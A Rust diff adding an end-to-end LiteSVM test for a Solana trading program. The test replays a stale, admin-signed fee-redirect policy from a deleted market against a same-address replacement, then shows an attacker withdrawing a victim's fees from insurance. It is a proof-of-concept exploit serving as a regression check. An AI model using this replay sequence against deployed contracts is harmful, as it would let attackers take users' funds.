@@ -61431,18 +61431,16 @@ fn e2e_stale_trade_fee_policy_cannot_cross_market_generations() {
     svm.send_transaction(presigned_trade)
         .expect("zero-fee trade signed before the replay is charged the stale floor");
 
-    let victim_capital = percolator_prog::state::read_portfolio(
-        &svm.get_account(&victim_portfolio).unwrap().data,
-    )
-    .unwrap()
-    .capital
-    .get();
-    let attacker_capital = percolator_prog::state::read_portfolio(
-        &svm.get_account(&attacker_portfolio).unwrap().data,
-    )
-    .unwrap()
-    .capital
-    .get();
+    let victim_capital =
+        percolator_prog::state::read_portfolio(&svm.get_account(&victim_portfolio).unwrap().data)
+            .unwrap()
+            .capital
+            .get();
+    let attacker_capital =
+        percolator_prog::state::read_portfolio(&svm.get_account(&attacker_portfolio).unwrap().data)
+            .unwrap()
+            .capital
+            .get();
     assert_eq!(victim_capital, DEPOSIT - FORCED_FEE_PER_SIDE);
     assert_eq!(attacker_capital, DEPOSIT - FORCED_FEE_PER_SIDE);
     assert_eq!(
@@ -61491,6 +61489,517 @@ fn e2e_stale_trade_fee_policy_cannot_cross_market_generations() {
     assert_eq!(token_amount(&svm, &vault), 18_001);
     panic!(
         "generation-A trade-fee policy transferred {FORCED_FEE_PER_SIDE} atoms from an independent victim"
+    );
+}
+
+// PUBLIC LOF: a fee-routing policy signed for a deleted market must not redirect fees from a
+// public same-address replacement into a permissionless asset owner's withdrawable insurance.
+#[test]
+fn e2e_stale_fee_redirect_policy_cannot_cross_market_generations() {
+    use percolator_prog::ix::Instruction as PIx;
+
+    const PRICE: u64 = 100;
+    const DEPOSIT: u128 = 10_000;
+    const SIZE_Q: i128 = 10 * percolator::POS_SCALE as i128;
+    const FORCED_FEE_BPS: u64 = 10_000;
+    const FORCED_FEE_PER_SIDE: u128 = 1_000;
+    const PROTECTED_REDIRECT_BPS: u16 = 10_000;
+    const STALE_REDIRECT_BPS: u16 = 0;
+
+    let mut svm =
+        LiteSVM::new().with_compute_budget(solana_program_runtime::compute_budget::ComputeBudget {
+            compute_unit_limit: 1_400_000,
+            heap_size: 256 * 1024,
+            ..solana_program_runtime::compute_budget::ComputeBudget::default()
+        });
+    svm.add_program_from_file(perc_id(), perc_so()).unwrap();
+    svm.set_sysvar(&Clock {
+        slot: 100,
+        unix_timestamp: 100,
+        ..Clock::default()
+    });
+
+    let payer = Keypair::new();
+    let admin = Keypair::new();
+    let attacker = Keypair::new();
+    let victim = Keypair::new();
+    for signer in [&payer, &admin, &attacker, &victim] {
+        svm.airdrop(&signer.pubkey(), 100_000_000_000).unwrap();
+    }
+    let mint_authority = Keypair::new();
+    let collateral_mint = create_real_mint(&mut svm, &payer, &mint_authority.pubkey());
+    let market_account = Keypair::new();
+    let market_len = percolator_prog::state::market_account_len_for_capacity(2).unwrap();
+    let market_rent = svm.minimum_balance_for_rent_exemption(market_len);
+    send(
+        &mut svm,
+        &[&payer, &market_account],
+        solana_sdk::system_instruction::create_account(
+            &payer.pubkey(),
+            &market_account.pubkey(),
+            market_rent,
+            market_len as u64,
+            &perc_id(),
+        ),
+    )
+    .expect("allocate generation A through System Program");
+    let market = market_account.pubkey();
+    let market_generation =
+        Pubkey::find_program_address(&[b"market-generation", market.as_ref()], &perc_id()).0;
+    let vault_authority = perc_vault_authority(&market, &perc_id());
+    let vault = canonical_insurance_vault(&vault_authority, &collateral_mint);
+    set_token(&mut svm, &vault, &collateral_mint, &vault_authority, 0);
+    let read_market_id = |svm: &LiteSVM, asset_index: u16| {
+        percolator_accounting::read_asset_market_id(
+            &svm.get_account(&market).unwrap().data,
+            asset_index as usize,
+        )
+        .unwrap()
+    };
+    let init_market = |svm: &mut LiteSVM| {
+        send(
+            svm,
+            &[&payer, &admin],
+            pix(
+                vec![
+                    AccountMeta::new(admin.pubkey(), true),
+                    AccountMeta::new(market, false),
+                    AccountMeta::new_readonly(collateral_mint, false),
+                    AccountMeta::new(market_generation, false),
+                    AccountMeta::new_readonly(system_program::ID, false),
+                ],
+                PIx::InitMarket {
+                    max_portfolio_assets: 1,
+                    h_min: 0,
+                    h_max: 10,
+                    initial_price: PRICE,
+                    min_nonzero_mm_req: 1,
+                    min_nonzero_im_req: 2,
+                    maintenance_margin_bps: 10_000,
+                    initial_margin_bps: 10_000,
+                    max_trading_fee_bps: 10_000,
+                    trade_fee_base_bps: FORCED_FEE_BPS,
+                    liquidation_fee_bps: 0,
+                    liquidation_fee_cap: 0,
+                    min_liquidation_abs: 0,
+                    max_price_move_bps_per_slot: 10_000,
+                    max_accrual_dt_slots: 1,
+                    max_abs_funding_e9_per_slot: 0,
+                    min_funding_lifetime_slots: 1,
+                    max_account_b_settlement_chunks: 1,
+                    max_bankrupt_close_chunks: 1,
+                    max_bankrupt_close_lifetime_slots: 100,
+                    public_b_chunk_atoms: percolator::MAX_VAULT_TVL,
+                    maintenance_fee_per_slot: 0,
+                },
+            ),
+        )
+    };
+    init_market(&mut svm).expect("initialize generation A");
+    let generation_a_id = read_market_id(&svm, 0);
+
+    let policy_accounts = || {
+        vec![
+            AccountMeta::new(admin.pubkey(), true),
+            AccountMeta::new(market, false),
+        ]
+    };
+    let legacy_policy = |redirect_bps| {
+        pix(
+            policy_accounts(),
+            PIx::UpdateFeeRedirectPolicy { redirect_bps },
+        )
+    };
+    let bound_policy = |market_id: u64, redirect_bps: u16| {
+        let mut data = vec![58u8];
+        data.extend_from_slice(&market_id.to_le_bytes());
+        data.extend_from_slice(&redirect_bps.to_le_bytes());
+        Instruction {
+            program_id: perc_id(),
+            accounts: policy_accounts(),
+            data,
+        }
+    };
+    let retained_blockhash = svm.latest_blockhash();
+    let stale_legacy = Transaction::new_signed_with_payer(
+        &[legacy_policy(STALE_REDIRECT_BPS)],
+        Some(&admin.pubkey()),
+        &[&admin],
+        retained_blockhash,
+    );
+    let stale_bound = Transaction::new_signed_with_payer(
+        &[bound_policy(generation_a_id, STALE_REDIRECT_BPS)],
+        Some(&admin.pubkey()),
+        &[&admin],
+        retained_blockhash,
+    );
+    let uses_market_id_wire = svm
+        .simulate_transaction(stale_legacy.clone().into())
+        .is_err();
+    if uses_market_id_wire {
+        assert!(svm.simulate_transaction(stale_bound.clone().into()).is_ok());
+    }
+    let stale_policy = if uses_market_id_wire {
+        stale_bound
+    } else {
+        stale_legacy
+    };
+
+    send(
+        &mut svm,
+        &[&payer, &admin],
+        pix(
+            vec![
+                AccountMeta::new_readonly(admin.pubkey(), true),
+                AccountMeta::new(market, false),
+            ],
+            PIx::ResolveMarket,
+        ),
+    )
+    .expect("resolve empty generation A");
+    let admin_destination = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &admin_destination,
+        &collateral_mint,
+        &admin.pubkey(),
+        0,
+    );
+    send(
+        &mut svm,
+        &[&payer, &admin],
+        pix(
+            vec![
+                AccountMeta::new(admin.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(vault, false),
+                AccountMeta::new_readonly(vault_authority, false),
+                AccountMeta::new(admin_destination, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+                AccountMeta::new(market_generation, false),
+                AccountMeta::new_readonly(system_program::ID, false),
+            ],
+            PIx::CloseSlab,
+        ),
+    )
+    .expect("close generation A through the public lifecycle");
+    assert!(svm
+        .get_account(&market)
+        .map_or(true, |account| account.lamports == 0));
+
+    svm.set_sysvar(&Clock {
+        slot: 101,
+        unix_timestamp: 101,
+        ..Clock::default()
+    });
+    // LiteSVM 0.1 retains zero-lamport account storage until the next program invocation. On chain,
+    // runtime cleanup removes it and System Program recreates the same signed address first.
+    init_market(&mut svm).expect("initialize generation B");
+    set_token(&mut svm, &vault, &collateral_mint, &vault_authority, 0);
+    let generation_b_id = read_market_id(&svm, 0);
+    if uses_market_id_wire {
+        assert!(generation_b_id > generation_a_id);
+    } else {
+        assert_eq!(generation_b_id, generation_a_id);
+    }
+
+    let fresh_redirect = if uses_market_id_wire {
+        bound_policy(generation_b_id, PROTECTED_REDIRECT_BPS)
+    } else {
+        legacy_policy(PROTECTED_REDIRECT_BPS)
+    };
+    send(&mut svm, &[&payer, &admin], fresh_redirect)
+        .expect("generation-B admin routes trading fees to protected market-0 insurance");
+    let fresh_config = percolator_prog::state::read_market_config_mode_and_capacity(
+        &svm.get_account(&market).unwrap().data,
+    )
+    .unwrap()
+    .0;
+    assert_eq!(
+        fresh_config.fee_redirect_to_market_0_bps,
+        PROTECTED_REDIRECT_BPS,
+    );
+
+    send(
+        &mut svm,
+        &[&payer, &admin],
+        pix(
+            vec![
+                AccountMeta::new_readonly(admin.pubkey(), true),
+                AccountMeta::new(market, false),
+            ],
+            PIx::UpdateMarketInitFeePolicy { min_init_fee: 1 },
+        ),
+    )
+    .expect("generation-B admin enables permissionless asset creation");
+    svm.set_sysvar(&Clock {
+        slot: 102,
+        unix_timestamp: 102,
+        ..Clock::default()
+    });
+    let init_fee_source = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &init_fee_source,
+        &collateral_mint,
+        &attacker.pubkey(),
+        1,
+    );
+    send(
+        &mut svm,
+        &[&payer, &attacker],
+        pix(
+            vec![
+                AccountMeta::new_readonly(attacker.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(init_fee_source, false),
+                AccountMeta::new(vault, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+            ],
+            PIx::UpdateAssetLifecycle {
+                action: 0,
+                asset_index: 1,
+                now_slot: 102,
+                initial_price: PRICE,
+                insurance_authority: attacker.pubkey().to_bytes(),
+                insurance_operator: attacker.pubkey().to_bytes(),
+                backing_bucket_authority: attacker.pubkey().to_bytes(),
+                oracle_authority: attacker.pubkey().to_bytes(),
+            },
+        ),
+    )
+    .expect("attacker permissionlessly creates asset 1 with the configured one-atom fee");
+    assert_eq!(token_amount(&svm, &init_fee_source), 0);
+    let asset_market_id = read_market_id(&svm, 1);
+
+    let portfolio_len = percolator_prog::state::portfolio_account_len_for_market_slots(2).unwrap();
+    let portfolio_rent = svm.minimum_balance_for_rent_exemption(portfolio_len);
+    let victim_account = Keypair::new();
+    let attacker_account = Keypair::new();
+    for (owner, portfolio) in [(&victim, &victim_account), (&attacker, &attacker_account)] {
+        send(
+            &mut svm,
+            &[&payer, portfolio],
+            solana_sdk::system_instruction::create_account(
+                &payer.pubkey(),
+                &portfolio.pubkey(),
+                portfolio_rent,
+                portfolio_len as u64,
+                &perc_id(),
+            ),
+        )
+        .expect("public user allocates a generation-B portfolio");
+        send(
+            &mut svm,
+            &[&payer, owner],
+            pix(
+                vec![
+                    AccountMeta::new(owner.pubkey(), true),
+                    AccountMeta::new(market, false),
+                    AccountMeta::new(portfolio.pubkey(), false),
+                ],
+                PIx::InitPortfolio,
+            ),
+        )
+        .expect("public user initializes a generation-B portfolio");
+    }
+    let victim_portfolio = victim_account.pubkey();
+    let attacker_portfolio = attacker_account.pubkey();
+    let victim_source = Pubkey::new_unique();
+    let attacker_source = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &victim_source,
+        &collateral_mint,
+        &victim.pubkey(),
+        DEPOSIT as u64,
+    );
+    set_token(
+        &mut svm,
+        &attacker_source,
+        &collateral_mint,
+        &attacker.pubkey(),
+        DEPOSIT as u64,
+    );
+    let deposit = |owner: &Keypair, portfolio: Pubkey, source: Pubkey| {
+        let ix = pix(
+            vec![
+                AccountMeta::new(owner.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(portfolio, false),
+                AccountMeta::new(source, false),
+                AccountMeta::new(vault, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+            ],
+            PIx::Deposit { amount: DEPOSIT },
+        );
+        Transaction::new_signed_with_payer(
+            &[ix],
+            Some(&payer.pubkey()),
+            &[&payer, owner],
+            svm.latest_blockhash(),
+        )
+    };
+    let presigned_victim_deposit = deposit(&victim, victim_portfolio, victim_source);
+    let presigned_attacker_deposit = deposit(&attacker, attacker_portfolio, attacker_source);
+    let trade_accounts = vec![
+        AccountMeta::new(victim.pubkey(), true),
+        AccountMeta::new(attacker.pubkey(), true),
+        AccountMeta::new(market, false),
+        AccountMeta::new(victim_portfolio, false),
+        AccountMeta::new(attacker_portfolio, false),
+    ];
+    let trade_ix = if uses_market_id_wire {
+        let mut data = vec![6u8];
+        data.extend_from_slice(&1u16.to_le_bytes());
+        data.extend_from_slice(&asset_market_id.to_le_bytes());
+        data.extend_from_slice(&SIZE_Q.to_le_bytes());
+        data.extend_from_slice(&PRICE.to_le_bytes());
+        data.extend_from_slice(&0u64.to_le_bytes());
+        Instruction {
+            program_id: perc_id(),
+            accounts: trade_accounts,
+            data,
+        }
+    } else {
+        pix(
+            trade_accounts,
+            PIx::TradeNoCpi {
+                asset_index: 1,
+                size_q: SIZE_Q,
+                exec_price: PRICE,
+                fee_bps: 0,
+            },
+        )
+    };
+    let presigned_trade = Transaction::new_signed_with_payer(
+        &[trade_ix],
+        Some(&payer.pubkey()),
+        &[&payer, &victim, &attacker],
+        svm.latest_blockhash(),
+    );
+
+    let market_before_replay = svm.get_account(&market).unwrap();
+    let replay = svm.send_transaction(stale_policy);
+    if uses_market_id_wire {
+        let error = replay.expect_err("generation-A fee redirect must reject in generation B");
+        assert_eq!(
+            error.err,
+            TransactionError::InstructionError(0, InstructionError::Custom(30)),
+        );
+        assert_eq!(svm.get_account(&market).unwrap(), market_before_replay);
+        svm.send_transaction(presigned_victim_deposit)
+            .expect("victim's pre-signed deposit remains live");
+        svm.send_transaction(presigned_attacker_deposit)
+            .expect("attacker's pre-signed deposit remains live");
+        svm.send_transaction(presigned_trade)
+            .expect("the pre-signed trade retains generation-B fee routing");
+        let victim_state = percolator_prog::state::read_portfolio(
+            &svm.get_account(&victim_portfolio).unwrap().data,
+        )
+        .unwrap();
+        let attacker_state = percolator_prog::state::read_portfolio(
+            &svm.get_account(&attacker_portfolio).unwrap().data,
+        )
+        .unwrap();
+        assert_eq!(victim_state.capital.get(), DEPOSIT - FORCED_FEE_PER_SIDE);
+        assert_eq!(attacker_state.capital.get(), DEPOSIT - FORCED_FEE_PER_SIDE);
+        assert_eq!(
+            percolator_accounting::read_asset_insurance_remaining(
+                &svm.get_account(&market).unwrap().data,
+                1,
+            )
+            .unwrap(),
+            0,
+        );
+        assert_eq!(
+            percolator_accounting::read_asset_insurance_remaining(
+                &svm.get_account(&market).unwrap().data,
+                0,
+            )
+            .unwrap(),
+            FORCED_FEE_PER_SIDE * 2 + 1,
+            "the replacement policy keeps both users' fees and the init fee in protected market-0 insurance",
+        );
+        return;
+    }
+    replay.expect("legacy generation-A fee redirect lands in generation B while empty");
+    svm.send_transaction(presigned_victim_deposit)
+        .expect("victim deposit signed before the replay still executes");
+    svm.send_transaction(presigned_attacker_deposit)
+        .expect("attacker deposit signed before the replay still executes");
+    svm.send_transaction(presigned_trade)
+        .expect("trade signed under protected routing executes after the stale redirect");
+
+    let victim_capital = percolator_prog::state::read_portfolio(
+        &svm.get_account(&victim_portfolio).unwrap().data,
+    )
+    .unwrap()
+    .capital
+    .get();
+    let attacker_capital = percolator_prog::state::read_portfolio(
+        &svm.get_account(&attacker_portfolio).unwrap().data,
+    )
+    .unwrap()
+    .capital
+    .get();
+    assert_eq!(victim_capital, DEPOSIT - FORCED_FEE_PER_SIDE);
+    assert_eq!(attacker_capital, DEPOSIT - FORCED_FEE_PER_SIDE);
+    assert_eq!(
+        percolator_accounting::read_asset_insurance_remaining(
+            &svm.get_account(&market).unwrap().data,
+            1,
+        )
+        .unwrap(),
+        FORCED_FEE_PER_SIDE * 2,
+    );
+    assert_eq!(
+        percolator_accounting::read_asset_insurance_remaining(
+            &svm.get_account(&market).unwrap().data,
+            0,
+        )
+        .unwrap(),
+        1,
+        "the stale redirect leaves only the one-atom init fee in protected market-0 insurance",
+    );
+
+    let attacker_destination = Pubkey::new_unique();
+    set_token(
+        &mut svm,
+        &attacker_destination,
+        &collateral_mint,
+        &attacker.pubkey(),
+        0,
+    );
+    send(
+        &mut svm,
+        &[&payer, &attacker],
+        pix(
+            vec![
+                AccountMeta::new_readonly(attacker.pubkey(), true),
+                AccountMeta::new(market, false),
+                AccountMeta::new(attacker_destination, false),
+                AccountMeta::new(vault, false),
+                AccountMeta::new_readonly(vault_authority, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+            ],
+            PIx::WithdrawInsuranceAsset {
+                asset_index: 1,
+                amount: FORCED_FEE_PER_SIDE * 2,
+            },
+        ),
+    )
+    .expect("permissionless asset operator withdraws both stale-policy fees");
+    let extracted = token_amount(&svm, &attacker_destination) as u128;
+    assert_eq!(extracted, FORCED_FEE_PER_SIDE * 2);
+    assert_eq!(
+        attacker_capital + extracted,
+        DEPOSIT + FORCED_FEE_PER_SIDE,
+        "the attacker gains exactly the independent victim's forced fee",
+    );
+    assert_eq!(token_amount(&svm, &vault), 18_001);
+    panic!(
+        "generation-A fee routing transferred {FORCED_FEE_PER_SIDE} atoms from an independent victim to the replacement asset owner"
     );
 }
 
